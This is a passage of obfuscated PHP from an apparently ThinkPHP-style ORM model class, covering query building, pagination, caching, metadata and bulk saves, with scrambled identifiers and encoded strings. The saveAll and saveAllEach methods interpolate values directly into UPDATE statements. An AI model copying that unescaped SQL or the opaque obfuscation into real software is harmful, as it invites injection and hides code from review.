$Ó†¿ùã± = '') { $àìÍ§ =& $_SERVER[ùÆÎÔ“Ñ]; if (!1 !== $·Àéõ×Ú) { $this->options[$àìÍ§[349]] = array($àìÍ§[94] => $·Àéõ×Ú, $àìÍ§[339] => $ˆÙî‚Ò­, $àìÍ§[33] => $Ó†¿ùã±); } return $this; } public function field($ğÀÓÖú˜, $Ü÷û£ü = false) { $šËâ‚ë¼ =& $_SERVER[ùÆÎÔ“Ñ]; if (!0 === $ğÀÓÖú˜) { $êÖçƒ¸­ = $this->getDbFields(); $ğÀÓÖú˜ = $êÖçƒ¸­ ? $êÖçƒ¸­ : $šËâ‚ë¼[188]; } elseif ($Ü÷û£ü) { if (is_string($ğÀÓÖú˜)) { $ğÀÓÖú˜ = explode($šËâ‚ë¼[50], $ğÀÓÖú˜); } $êÖçƒ¸­ = $this->getDbFields(); $ğÀÓÖú˜ = $êÖçƒ¸­ ? array_diff($êÖçƒ¸­, $ğÀÓÖú˜) : $ğÀÓÖú˜; } $this->options[$šËâ‚ë¼[273]] = $ğÀÓÖú˜; return $this; } public function scope($ßåñ£„ = '', $‡æŒøƒø = NULL) { $ĞÅÌàÙ… =& $_SERVER[ùÆÎÔ“Ñ]; if ($ĞÅÌàÙ…[12] === $ßåñ£„) { if (isset($this->_scope[$ĞÅÌàÙ…[37]])) { $Çä—×§ì = $this->_scope[$ĞÅÌàÙ…[37]]; } else { return $this; } } elseif (is_string($ßåñ£„)) { $ş­Š ûİ = explode($ĞÅÌàÙ…[50], $ßåñ£„); $Çä—×§ì = array(); foreach ($ş­Š ûİ as $ØÀ½ÏÄˆ) { if (!isset($this->_scope[$ØÀ½ÏÄˆ])) { continue; } $Çä—×§ì = array_merge($Çä—×§ì, $this->_scope[$ØÀ½ÏÄˆ]); } if (!empty($‡æŒøƒø) && is_array($‡æŒøƒø)) { $Çä—×§ì = array_merge($Çä—×§ì, $‡æŒøƒø); } } elseif (is_array($ßåñ£„)) { $Çä—×§ì = $ßåñ£„; } if (is_array($Çä—×§ì) && !empty($Çä—×§ì)) { $this->options = array_merge($this->options, array_change_key_case($Çä—×§ì)); } return $this; } public function where($¶ƒú¨’¢, $©ëüÂ—± = null) { $ĞÔ¥¹Àì =& $_SERVER[ùÆÎÔ“Ñ]; if (!is_null($©ëüÂ—±) && is_string($¶ƒú¨’¢)) { if (!is_array($©ëüÂ—±)) { $©ëüÂ—± = func_get_args(); array_shift($©ëüÂ—±); } $©ëüÂ—± = array_map(array($this->db, $ĞÔ¥¹Àì[343]), $©ëüÂ—±); $¶ƒú¨’¢ = vsprintf($¶ƒú¨’¢, $©ëüÂ—±); } elseif (is_object($¶ƒú¨’¢)) { $¶ƒú¨’¢ = get_object_vars($¶ƒú¨’¢); } elseif (is_array($¶ƒú¨’¢)) { foreach ($¶ƒú¨’¢ as $«½ş«£ä => $á‹Üç©) { if ((is_numeric($«½ş«£ä) || !$«½ş«£ä) && is_string($á‹Üç©)) { if (strpos($á‹Üç©, $ĞÔ¥¹Àì[350]) === 0) { continue; } think_trace($ĞÔ¥¹Àì[351], $ĞÔ¥¹Àì[12], $ĞÔ¥¹Àì[49]); die; } } } if (is_string($¶ƒú¨’¢) && $ĞÔ¥¹Àì[12] != $¶ƒú¨’¢) { $ûÌºÜâ‚ = array(); $ûÌºÜâ‚[$ĞÔ¥¹Àì[352]] = $¶ƒú¨’¢; $¶ƒú¨’¢ = $ûÌºÜâ‚; } if (isset($this->options[$ĞÔ¥¹Àì[275]])) { $this->options[$ĞÔ¥¹Àì[275]] = array_merge($this->options[$ĞÔ¥¹Àì[275]], $¶ƒú¨’¢); } else { $this->options[$ĞÔ¥¹Àì[275]] = $¶ƒú¨’¢; } return $this; } public function limit($¬è³±ëÆ, $ø€İ“¥é = null) { $£óªí×î =& $_SERVER[ùÆÎÔ“Ñ]; $this->options[$£óªí×î[292]] = is_null($ø€İ“¥é) ? $¬è³±ëÆ : $¬è³±ëÆ . $£óªí×î[50] . $ø€İ“¥é; return $this; } public function page($Çõ„ …, $¥¦¢Âêº = null) { $âÊˆˆ®€ =& $_SERVER[ùÆÎÔ“Ñ]; $this->options[$âÊˆˆ®€[353]] = is_null($¥¦¢Âêº) ? $Çõ„ … : $Çõ„ … . $âÊˆˆ®€[50] . $¥¦¢Âêº; return $this; } public function comment($šóäÇé–) { $this->options[$_SERVER[ùÆÎÔ“Ñ][354]] = $šóäÇé–; return $this; } public function setProperty($±ŒŠ, $Çí»æÁÙ) { if (property_exists($this, $±ŒŠ)) { $this->{$±ŒŠ} = $Çí»æÁÙ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\146\x79\124\x69\155\145", "\x74\x69\155\x65", "\151\x6e\163\x65\162\x74\x2c\x75\x70\x64\141\164\145", "\146\x75\x6e\x63\x74\151\x6f\156"), array("\143\162\145\141\x74\x65\x54\x69\x6d\x65", "\164\x69\155\145", "\151\156\x73\145\162\x74", "\x66\x75\156\143\164\151\x6f\156")); public function setDataAuto($Â–ãıÔá) { $this->dataAuto = $Â–ãıÔá; } public function __construct($ƒûë«ò = '', $é™Ü©• = '', $³ ¯·µ = '') { parent::__construct($ƒûë«ò, $é™Ü©•, $³ ¯·µ); } protected $tableMeta = array(); protected function _beforeInsert(&$Œ®¾Í¨œ, $Í”Ë°Èë) { $Ú§ÜƒÁí =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->checkDataAutoHas($Ú§ÜƒÁí[355])) { return; } $this->dataBeforeFilter($Œ®¾Í¨œ, $Ú§ÜƒÁí[355]); } protected function _beforeUpdate(&$”Á¶¢„â, $áÓ·é–®) { $ø€’¥Š =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->checkDataAutoHas($ø€’¥Š[356])) { return; } $this->dataBeforeFilter($”Á¶¢„â, $ø€’¥Š[356]); } protected function _afterSelect(&$¤Ë ¯², $×ñ«±¤Ò) { if (!is_array($¤Ë ¯²)) { return; } if (!$this->checkDataAutoHas($_SERVER[ùÆÎÔ“Ñ][357])) { return; } foreach ($¤Ë ¯² as &$©•¬¨°¬) { $this->dataAfterFilter($©•¬¨°¬); } unset($©•¬¨°¬); } protected function _afterFind(&$˜êøúÓÓ, $¸ûğÜ°„) { if (!is_array($˜êøúÓÓ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ùÆÎÔ“Ñ][357])) { return; } $this->dataAfterFilter($˜êøúÓÓ); } public static function textEncode($ãÑ«û©) { if (!$ãÑ«û©) { return $ãÑ«û©; } $ƒè•–ü = json_encode($ãÑ«û©); $ƒè•–ü = preg_replace_callback($_SERVER[ùÆÎÔ“Ñ][358], function ($áùŸ›Ÿ¢) { return addslashes($áùŸ›Ÿ¢[0]); }, $ƒè•–ü); return json_decode($ƒè•–ü); } public static function textDecode($€øıœ©Å) { $Ÿ¶İÄ =& $_SERVER[ùÆÎÔ“Ñ]; $¹ß³ÏØŠ = json_encode($€øıœ©Å); $¹ß³ÏØŠ = preg_replace_callback($Ÿ¶İÄ[359], function ($ãÄ´£³·) { return $_SERVER[ùÆÎÔ“Ñ][97]; }, $¹ß³ÏØŠ); return json_decode($¹ß³ÏØŠ); } public function setAutoIncrement($íóÂöÒ«) { $î‡Ùà×Ù = array($this->getPk() => $íóÂöÒ«); $¼ú¸ø”Ø = $this->data($î‡Ùà×Ù)->add(); if ($¼ú¸ø”Ø) { $this->delete($¼ú¸ø”Ø); } } public function getAutoIncrement() { $¿ùâ«º = $this->getTableName(); $ÈµáÓ = $this->max($this->getPk()); $Í¶×‡íØ = $this->query("\163\150\157\x77\40\164\x61\142\154\x65\40\x73\x74\x61\164\165\x73\x20\x77\150\x65\x72\145\40\x4e\x61\155\x65\75\x27{$¿ùâ«º}\47"); $×­Í®¦Í = $Í¶×‡íØ[0][$_SERVER[ùÆÎÔ“Ñ][360]]; $°İäÊ¦Ä = max($ÈµáÓ, $×­Í®¦Í); return $°İäÊ¦Ä; } protected function _callBefore($¸¥ÍÒÌü, $á»êÆŸ¿) { return $this->cacheCallCheck($¸¥ÍÒÌü, $á»êÆŸ¿, !1); } protected function _callAfter($‚Û²ä±—, $ˆ©ñÎÄ«) { return $this->cacheCallCheck($‚Û²ä±—, $ˆ©ñÎÄ«, !0); } protected function cacheFunctionAlias($‚’½¾ÔÃ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($“ßíÉâÎ, $à—şêà¯, $±İ¦Óıˆ = false) { $ì“ÆË“µ = $this->cacheFunctionAlias($à—şêà¯); if (!$ì“ÆË“µ) { return; } foreach ($ì“ÆË“µ as $†ßã»Ó => $ÜîõØá¾) { $ËËëë¼ = $ÜîõØá¾[0]; $üÆôñœ÷ = explode($_SERVER[ùÆÎÔ“Ñ][50], $ÜîõØá¾[1]); if ($“ßíÉâÎ == $†ßã»Ó) { return $this->cacheFunctionGet($†ßã»Ó, $ËËëë¼); } if ($±İ¦Óıˆ && in_array($“ßíÉâÎ, $üÆôñœ÷)) { $this->cacheFunctionClear($†ßã»Ó, $ËËëë¼); } } } public function cacheFunctionGet($êÊ¼£’ë, $áÖÒ«İ²) { $¢ĞˆÌÃÎ = $this->cacheKeyMake($êÊ¼£’ë, $áÖÒ«İ²); $òÔˆ¿ÁØ = Cache::get($¢ĞˆÌÃÎ); if (!is_array($òÔˆ¿ÁØ)) { $òÔˆ¿ÁØ = call_user_func_array(array($this, $êÊ¼£’ë), array($áÖÒ«İ², !0)); Cache::set($¢ĞˆÌÃÎ, $òÔˆ¿ÁØ); } return $òÔˆ¿ÁØ; } public function cacheFunctionClear($îÑ¦¤Îˆ, $µùñ”¶) { $±Œ³©’è = $µùñ”¶; if (!is_array($µùñ”¶)) { $±Œ³©’è = array($µùñ”¶); } foreach ($±Œ³©’è as $íõÙÍÉ) { $ô¡¥õ— = $this->cacheKeyMake($îÑ¦¤Îˆ, $íõÙÍÉ); Cache::remove($ô¡¥õ—); } } private function cacheKeyMake($ùÔö·×¶, $‚ŠÍ¥…ø) { $¼Ãµß›š =& $_SERVER[ùÆÎÔ“Ñ]; return get_class($this) . $¼Ãµß›š[11] . $ùÔö·×¶ . $¼Ãµß›š[361] . $‚ŠÍ¥…ø; } protected function selectPageReset() { $ÚµÖˆ’ =& $_SERVER[ùÆÎÔ“Ñ]; if (isset($GLOBALS[$ÚµÖˆ’[362]])) { return; } $GLOBALS[$ÚµÖˆ’[362]] = isset($GLOBALS[$ÚµÖˆ’[7]][$ÚµÖˆ’[363]]) ? $GLOBALS[$ÚµÖˆ’[7]][$ÚµÖˆ’[363]] : !1; $GLOBALS[$ÚµÖˆ’[364]] = isset($GLOBALS[$ÚµÖˆ’[7]][$ÚµÖˆ’[353]]) ? $GLOBALS[$ÚµÖˆ’[7]][$ÚµÖˆ’[353]] : !1; $GLOBALS[$ÚµÖˆ’[7]][$ÚµÖˆ’[363]] = !1; $GLOBALS[$ÚµÖˆ’[7]][$ÚµÖˆ’[353]] = !1; } protected function selectPageRestore() { $·‚ºŞºŠ =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($GLOBALS[$·‚ºŞºŠ[362]])) { return; } $GLOBALS[$·‚ºŞºŠ[7]][$·‚ºŞºŠ[363]] = $GLOBALS[$·‚ºŞºŠ[362]]; $GLOBALS[$·‚ºŞºŠ[7]][$·‚ºŞºŠ[353]] = $GLOBALS[$·‚ºŞºŠ[364]]; if ($GLOBALS[$·‚ºŞºŠ[7]][$·‚ºŞºŠ[363]] === !1) { unset($GLOBALS[$·‚ºŞºŠ[7]][$·‚ºŞºŠ[363]]); } if ($GLOBALS[$·‚ºŞºŠ[7]][$·‚ºŞºŠ[353]] === !1) { unset($GLOBALS[$·‚ºŞºŠ[7]][$·‚ºŞºŠ[353]]); } unset($GLOBALS[$·‚ºŞºŠ[362]]); unset($GLOBALS[$·‚ºŞºŠ[364]]); } protected function selectPage($Æò™²†¨ = 200, $È”±¾† = 1) { $Ù‚¥¦«ı =& $_SERVER[ùÆÎÔ“Ñ]; global $in; $ï¾ú¬ñİ = $this->optionsValue(); $ÚáŒë²Ÿ = 50000; $Æò™²†¨ = isset($in[$Ù‚¥¦«ı[363]]) && $in[$Ù‚¥¦«ı[363]] ? $in[$Ù‚¥¦«ı[363]] : $Æò™²†¨; if ($Æò™²†¨ === -1) { $in[$Ù‚¥¦«ı[363]] = !1; $ÚáŒë²Ÿ = 100000000; $Æò™²†¨ = $ÚáŒë²Ÿ; } $Â³Œ§î = $ï¾ú¬ñİ; $Â³Œ§î[$Ù‚¥¦«ı[365]] = array(); $Æò™²†¨ = intval($Æò™²†¨); $Æò™²†¨ = $Æò™²†¨ <= 5 ? 5 : ($Æò™²†¨ >= $ÚáŒë²Ÿ ? $ÚáŒë²Ÿ : $Æò™²†¨); $È”±¾† = intval(isset($in[$Ù‚¥¦«ı[353]]) && $in[$Ù‚¥¦«ı[353]] ? $in[$Ù‚¥¦«ı[353]] : $È”±¾†); $È”±¾† = $È”±¾† <= 1 ? 1 : $È”±¾†; $ì¶º‰·Ä = array(); $Ö¦Úçº• = 1; if ($È”±¾† == 1 && $Ö¦Úçº•) { $this->optionsValue($ï¾ú¬ñİ); $ì¶º‰·Ä = $this->page($È”±¾†, $Æò™²†¨)->select(); $ÃÛ™Ôƒ… = is_array($ì¶º‰·Ä) ? count($ì¶º‰·Ä) : 0; if ($ÃÛ™Ôƒ… < $Æò™²†¨) { $×ø§Ö°² = 1; } else { $this->optionsValue($Â³Œ§î); $ÃÛ™Ôƒ… = intval($this->count()); $×ø§Ö°² = ceil($ÃÛ™Ôƒ… / $Æò™²†¨); } } else { $this->optionsValue($Â³Œ§î); $ÃÛ™Ôƒ… = intval($this->count()); $×ø§Ö°² = ceil($ÃÛ™Ôƒ… / $Æò™²†¨); $È”±¾† = $È”±¾† >= $×ø§Ö°² ? $×ø§Ö°² : $È”±¾†; $this->optionsValue($ï¾ú¬ñİ); $ì¶º‰·Ä = $this->page($È”±¾†, $Æò™²†¨)->select(); } if (!is_array($ì¶º‰·Ä)) { $ì¶º‰·Ä = array(); } if ($×ø§Ö°² == 1) { $ÃÛ™Ôƒ… = count($ì¶º‰·Ä); } $À»á¹Õ® = array($Ù‚¥¦«ı[366] => array($Ù‚¥¦«ı[367] => $ÃÛ™Ôƒ…, $Ù‚¥¦«ı[363] => $Æò™²†¨, $Ù‚¥¦«ı[353] => $È”±¾†, $Ù‚¥¦«ı[368] => $×ø§Ö°²), $Ù‚¥¦«ı[369] => $ì¶º‰·Ä); return $À»á¹Õ®; } protected function checkLength($¼ëİ¡«, $¸× Ùöü = 0, $äßÆãš– = '') { $ûµöÔ– =& $_SERVER[ùÆÎÔ“Ñ]; $¸× Ùöü = $¸× Ùöü ? $¸× Ùöü : 65536; if (!$¼ëİ¡« || strlen($¼ëİ¡«) < $¸× Ùöü) { return; } $äßÆãš– = $äßÆãš– ? $äßÆãš– . $ûµöÔ–[71] : $ûµöÔ–[12]; show_json($äßÆãš– . LNG($ûµöÔ–[370]) . "\50{$¸× Ùöü}\x29", !1); } protected function metaSet($¯ÃüÙşí, $öŒ§ÅÔÎ = null, $¸Ü°Ê÷„ = null) { $ú×ùâÀŠ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->tableMeta || !$¯ÃüÙşí) { return !1; } $óûš¨·Ù = $this->tableMeta[$ú×ùâÀŠ[371]]; $¦ÛÈ¡í  = $this->tableMeta[$ú×ùâÀŠ[372]]; $ÖÄ×½Ã¨ = Model($¦ÛÈ¡í ); $îÖÌâ“ = array($óûš¨·Ù => $¯ÃüÙşí, $ú×ùâÀŠ[373] => $öŒ§ÅÔÎ); if (is_null($öŒ§ÅÔÎ)) { return $ÖÄ×½Ã¨->where(array($óûš¨·Ù => $¯ÃüÙşí))->delete(); } if (is_null($¸Ü°Ê÷„) && is_string($öŒ§ÅÔÎ)) { return $ÖÄ×½Ã¨->where($îÖÌâ“)->delete(); } $ò…êŠ€ƒ = is_array($öŒ§ÅÔÎ) ? $öŒ§ÅÔÎ : array(); if (is_string($öŒ§ÅÔÎ)) { $ò…êŠ€ƒ[$öŒ§ÅÔÎ] = $¸Ü°Ê÷„; } $•ÎÂÔÆı = array(); foreach ($ò…êŠ€ƒ as $ˆèÃ‹‹ => $ÛêßıÙº) { if (is_null($ÛêßıÙº) && is_string($ˆèÃ‹‹)) { $ÖÄ×½Ã¨->where(array($óûš¨·Ù => $¯ÃüÙşí, $ú×ùâÀŠ[373] => $ˆèÃ‹‹))->delete(); continue; } $this->checkLength($ÛêßıÙº, !1, $¦ÛÈ¡í  . $ú×ùâÀŠ[4] . $ˆèÃ‹‹); $•ÎÂÔÆı[] = array($óûš¨·Ù => $¯ÃüÙşí, $ú×ùâÀŠ[94] => $ˆèÃ‹‹, $ú×ùâÀŠ[374] => $ÛêßıÙº); } $ŸÜ«ÂĞÓ = $ú×ùâÀŠ[375] . $¦ÛÈ¡í ; CacheLock::lock($ŸÜ«ÂĞÓ); $ÖÄ×½Ã¨->where(array($óûš¨·Ù => $¯ÃüÙşí))->addAll($•ÎÂÔÆı, array(), !0); CacheLock::unlock($ŸÜ«ÂĞÓ); return !0; } public function metaGet($ä³¸ğÎ÷, $°¡‰¾°Ñ = false) { $¸£»®²¡ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->tableMeta) { return array(); } $ŸÓá¯¨ş = $this->tableMeta[$¸£»®²¡[371]]; $Š×‰òŞÀ = Model($this->tableMeta[$¸£»®²¡[372]]); if ($°¡‰¾°Ñ) { $ÖéÅ‚Ô½ = array($ŸÓá¯¨ş => $ä³¸ğÎ÷, $¸£»®²¡[94] => $°¡‰¾°Ñ); return $Š×‰òŞÀ->where($ÖéÅ‚Ô½)->getField($¸£»®²¡[374]); } $ÖéÅ‚Ô½ = array($ŸÓá¯¨ş => $ä³¸ğÎ÷); $ƒ˜ı”ª = $Š×‰òŞÀ->field($¸£»®²¡[376])->where($ÖéÅ‚Ô½)->select(); $ƒ˜ı”ª = array_to_keyvalue($ƒ˜ı”ª, $¸£»®²¡[94], $¸£»®²¡[374]); return $ƒ˜ı”ª; } private function checkDataAutoHas($¦ã³Ğù) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $”üŒïÜ¾) { if (in_array($¦ã³Ğù, explode($_SERVER[ùÆÎÔ“Ñ][50], $”üŒïÜ¾[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ó‡•À³…, $æ¼å­›š) { $Ÿ«ÛÉÊ´ =& $_SERVER[ùÆÎÔ“Ñ]; if (!is_array($Ó‡•À³…)) { return; } foreach ($this->dataAuto as $ÉÚ§ŒÙ) { $õ˜£Áê = $ÉÚ§ŒÙ[0]; if (!in_array($æ¼å­›š, explode($Ÿ«ÛÉÊ´[50], $ÉÚ§ŒÙ[2]))) { continue; } switch (trim($ÉÚ§ŒÙ[3])) { case $Ÿ«ÛÉÊ´[321]: case $Ÿ«ÛÉÊ´[322]: $À¾Âô®Ì = $ÉÚ§ŒÙ[1]; $ÁªÜƒ¥¬ = isset($ÉÚ§ŒÙ[4]) ? (array) $ÉÚ§ŒÙ[4] : array(); if ($À¾Âô®Ì == $Ÿ«ÛÉÊ´[203] && array_key_exists($õ˜£Áê, $Ó‡•À³…)) { if (!$Ó‡•À³…[$õ˜£Áê]) { unset($Ó‡•À³…[$õ˜£Áê]); } break; } if (isset($Ó‡•À³…[$õ˜£Áê])) { array_unshift($ÁªÜƒ¥¬, $Ó‡•À³…[$õ˜£Áê]); } if ($Ÿ«ÛÉÊ´[321] == $ÉÚ§ŒÙ[3]) { $Ó‡•À³…[$õ˜£Áê] = call_user_func_array($À¾Âô®Ì, $ÁªÜƒ¥¬); } else { $Ó‡•À³…[$õ˜£Áê] = call_user_func_array(array(&$this, $À¾Âô®Ì), $ÁªÜƒ¥¬); } break; case $Ÿ«ÛÉÊ´[270]: if (isset($Ó‡•À³…[$õ˜£Áê]) && $Ó‡•À³…[$õ˜£Áê]) { $Ó‡•À³…[$õ˜£Áê] = call_user_func_array(array(&$this, $ÉÚ§ŒÙ[1]), array($Ó‡•À³…[$õ˜£Áê])); } break; case $Ÿ«ÛÉÊ´[273]: $Ó‡•À³…[$õ˜£Áê] = $Ó‡•À³…[$ÉÚ§ŒÙ[1]]; break; case $Ÿ«ÛÉÊ´[294]: if (isset($Ó‡•À³…[$õ˜£Áê]) && !is_string($Ó‡•À³…[$õ˜£Áê])) { $Ó‡•À³…[$õ˜£Áê] = json_encode_force($Ó‡•À³…[$õ˜£Áê]); } break; case $Ÿ«ÛÉÊ´[323]: if ($Ó‡•À³…[$õ˜£Áê] === $Ÿ«ÛÉÊ´[12]) { unset($Ó‡•À³…[$õ˜£Áê]); } break; case $Ÿ«ÛÉÊ´[324]: $Ó‡•À³…[$õ˜£Áê] = $ÉÚ§ŒÙ[1]; default: break; } } if ($æ¼å­›š == $Ÿ«ÛÉÊ´[355]) { $¬Ä„§Ç = strtolower($this->db->getDbType()); if (strpos($¬Ä„§Ç, $Ÿ«ÛÉÊ´[13]) !== 0) { return; } $Î¹Ğ¹¬ = $this->field(!0)->fields; $™Õ›Êè = $Î¹Ğ¹¬[$Ÿ«ÛÉÊ´[252]]; if (isset($Î¹Ğ¹¬[$Ÿ«ÛÉÊ´[251]])) { unset($™Õ›Êè[$Î¹Ğ¹¬[$Ÿ«ÛÉÊ´[251]]]); } foreach ($™Õ›Êè as $Íı§éÎ => $æ¼å­›š) { if (!isset($Ó‡•À³…[$Íı§éÎ])) { $Ó‡•À³…[$Íı§éÎ] = $Ÿ«ÛÉÊ´[12]; } } } } private function dataAfterFilter(&$°…µ„…Ö) { $¨è–Ê×¨ =& $_SERVER[ùÆÎÔ“Ñ]; foreach ($this->dataAuto as $ü‘µÑŒà) { $©Ø¸·œ = $ü‘µÑŒà[0]; if (!isset($°…µ„…Ö[$©Ø¸·œ])) { continue; } if (!in_array($¨è–Ê×¨[357], explode($¨è–Ê×¨[50], $ü‘µÑŒà[2]))) { continue; } switch (trim($ü‘µÑŒà[3])) { case $¨è–Ê×¨[321]: case $¨è–Ê×¨[322]: $˜İØ–Œê = isset($ü‘µÑŒà[4]) ? (array) $ü‘µÑŒà[4] : array(); array_unshift($˜İØ–Œê, $°…µ„…Ö[$©Ø¸·œ]); if (isset($ü‘µÑŒà[4]) && $ü‘µÑŒà[4] == $¨è–Ê×¨[377]) { $˜İØ–Œê = array($°…µ„…Ö[$©Ø¸·œ]); } if ($¨è–Ê×¨[321] == $ü‘µÑŒà[3]) { $°…µ„…Ö[$©Ø¸·œ] = call_user_func_array($ü‘µÑŒà[1], $˜İØ–Œê); } else { $°…µ„…Ö[$©Ø¸·œ] = call_user_func_array(array(&$this, $ü‘µÑŒà[1]), $˜İØ–Œê); } break; case $¨è–Ê×¨[270]: if (isset($°…µ„…Ö[$©Ø¸·œ]) && $°…µ„…Ö[$©Ø¸·œ]) { $°…µ„…Ö[$©Ø¸·œ] = call_user_func_array(array(&$this, $ü‘µÑŒà[1]), array($°…µ„…Ö[$©Ø¸·œ])); } break; case $¨è–Ê×¨[273]: $°…µ„…Ö[$©Ø¸·œ] = $°…µ„…Ö[$ü‘µÑŒà[1]]; break; case $¨è–Ê×¨[294]: $¢óªî = $°…µ„…Ö[$©Ø¸·œ]; $°…µ„…Ö[$©Ø¸·œ] = json_decode($¢óªî, !0); if (is_null($°…µ„…Ö[$©Ø¸·œ])) { $°…µ„…Ö[$©Ø¸·œ] = $¢óªî; } break; case $¨è–Ê×¨[323]: if ($°…µ„…Ö[$©Ø¸·œ] === $¨è–Ê×¨[12]) { unset($°…µ„…Ö[$©Ø¸·œ]); } break; case $¨è–Ê×¨[324]: $°…µ„…Ö[$©Ø¸·œ] = $ü‘µÑŒà[1]; break; default: break; } } } public function saveAll($ÜÎó¾¸•) { $Øì» Ÿ  =& $_SERVER[ùÆÎÔ“Ñ]; $ÄÁÊ®ê = $this->tablePrefix . $this->tableName; $ç™ûîèÁ = self::SQL_WHERE_IN_CHUNK; $ÜÎó¾¸• = is_array($ÜÎó¾¸•) ? $ÜÎó¾¸• : array(); $ŞœÍÁä = $Øì» Ÿ [378]; $·÷Öº‚ş = 0; $Ø¾Îã†Ê = array(); $ê‰­¡Êİ = count($ÜÎó¾¸•); for ($³óåıŞ— = 0; $³óåıŞ— < $ê‰­¡Êİ; $³óåıŞ—++) { $Æêßğ¨ß = $ÜÎó¾¸•[$³óåıŞ—]; if (!is_array($Æêßğ¨ß) || count($Æêßğ¨ß) != 4) { continue; } $šÕÛÓ« = "\125\x50\x44\101\x54\x45\40\140{$ÄÁÊ®ê}\140\x20\x53\105\x54\40{$Æêßğ¨ß[2]}\x20\x3d\40\103\x41\123\x45\x20{$Æêßğ¨ß[0]}\40\12"; if ($·÷Öº‚ş == 0) { $ŞœÍÁä = $šÕÛÓ«; } $Ø¾Îã†Ê[] = $Øì» Ÿ [118] . $Æêßğ¨ß[1] . $Øì» Ÿ [118]; $·÷Öº‚ş++; $ŞœÍÁä .= "\x20\127\x48\x45\x4e\40\47{$Æêßğ¨ß[1]}\x27\40\x54\110\105\x4e\x20\47{$Æêßğ¨ß[3]}\47\40\xa"; if ($·÷Öº‚ş == $ç™ûîèÁ || $³óåıŞ— == $ê‰­¡Êİ - 1) { $ã›ÑÃ = implode($Øì» Ÿ [50], $Ø¾Îã†Ê); $ŞœÍÁä .= "\x20\x45\x4e\x44\x20\x20\127\x48\105\x52\x45\x20{$Æêßğ¨ß[0]}\x20\111\116\x20\x28{$ã›ÑÃ}\51\40"; $this->execute($ŞœÍÁä); $·÷Öº‚ş = 0; $ŞœÍÁä = $šÕÛÓ«; $this->chunkEventCheck(count($Ø¾Îã†Ê)); $Ø¾Îã†Ê = array(); } } $this->chunkEventSet(); } public function saveAllEach($™»‰ØŒ) { $¬Ø‚ö  =& $_SERVER[ùÆÎÔ“Ñ]; $®šŸ´Àë = $this->tablePrefix . $this->tableName; foreach ($™»‰ØŒ as $É Èáì») { if (!is_array($É Èáì») || count($É Èáì») != 4) { continue; } $¸÷«é• = $É Èáì»[0] . $¬Ø‚ö [379] . $É Èáì»[1] . $¬Ø‚ö [118]; $éÃ÷±Ò• = $É Èáì»[2] . $¬Ø‚ö [379] . $É Èáì»[3] . $¬Ø‚ö [118]; $Ì§Ë¹Ïˆ = "\165\x70\x64\x61\x74\x65\x20{$®šŸ´Àë}\40\x73\x65\164\40{$éÃ÷±Ò•}\x20\x77\x68\x65\162\x65\x20{$¸÷«é•}\73"; $this->execute($Ì§Ë¹Ïˆ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($÷–‘´ŠÍ = false, $ğÌİÚá³ = false) { $this->_chunkEvent = $÷–‘´ŠÍ; $this->_chunkEventParam = $ğÌİÚá³; } private function chunkEventCheck($Äå÷ûãŸ) { if (!$this->_chunkEvent) { return; } $ßÏãÑĞ† = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ßÏãÑĞ†[$_SERVER[ùÆÎÔ“Ñ][380]] = $Äå÷ûãŸ; Hook::trigger($this->_chunkEvent, $ßÏãÑĞ†); } public function addAll($¼İâ­öÜ, $×ÂŒïÇú = array(), $Õœ’Ïêè = false) { $—¦¥•¿ø =& $_SERVER[ùÆÎÔ“Ñ]; ignore_timeout(); $˜½òÑê = self::SQL_WHERE_IN_CHUNK; if (empty($¼İâ­öÜ)) { $this->error = think_lang($—¦¥•¿ø[271]); return !1; } $×ÂŒïÇú = $this->_parseOptions($×ÂŒïÇú); foreach ($¼İâ­öÜ as $óûˆ¨¿ª => $´—Ñ‹Ìı) { $¼İâ­öÜ[$óûˆ¨¿ª] = $this->_facade($´—Ñ‹Ìı); $this->_beforeInsert($¼İâ­öÜ[$óûˆ¨¿ª], $×ÂŒïÇú); } if (method_exists($this->db, $—¦¥•¿ø[272])) { for ($ÄøöİĞğ = 0; $ÄøöİĞğ < count($¼İâ­öÜ); $ÄøöİĞğ += $˜½òÑê) { $¯¡Àìó = array_slice($¼İâ­öÜ, $ÄøöİĞğ, $˜½òÑê); if (!is_array($¯¡Àìó) || count($¯¡Àìó) == 0) { break; } $éë­·Ó† = $this->db->insertAll($¯¡Àìó, $×ÂŒïÇú, $Õœ’Ïêè); $this->chunkEventCheck(count($¯¡Àìó)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¼İâ­öÜ as $óûˆ¨¿ª => $´—Ñ‹Ìı) { $éë­·Ó† = $this->db->insert($´—Ñ‹Ìı, $×ÂŒïÇú, $Õœ’Ïêè); } $this->commit(); } if (!1 !== $éë­·Ó†) { $šì‰èğ¢ = $this->getLastInsID(); if ($šì‰èğ¢) { return $šì‰èğ¢; } } return $éë­·Ó†; } public function save($ÂåÖ±©« = '', $ÀµˆÒï» = array()) { $Ùí‹®ôÖ =& $_SERVER[ùÆÎÔ“Ñ]; $¥¬ø£˜™ = self::SQL_WHERE_IN_CHUNK; $Ú’Ä »è = $this->optionsValue(); $µ—À ñ = $this->findWhereField($Ú’Ä »è); if (!$µ—À ñ) { return parent::save($ÂåÖ±©«, $ÀµˆÒï»); } $‘ç¡ñî = 0; $¨³ø˜ª¾ = $Ú’Ä »è[$Ùí‹®ôÖ[275]][$µ—À ñ][1]; $¨³ø˜ª¾ = is_array($¨³ø˜ª¾) ? $¨³ø˜ª¾ : array(); $×½ûº = count($¨³ø˜ª¾); for ($‡Ğ¨¸÷ = 0; $‡Ğ¨¸÷ < $×½ûº; $‡Ğ¨¸÷ += $¥¬ø£˜™) { $éãÜ‡€ª = array_slice($¨³ø˜ª¾, $‡Ğ¨¸÷, $¥¬ø£˜™); if (!is_array($éãÜ‡€ª) || count($éãÜ‡€ª) == 0) { break; } 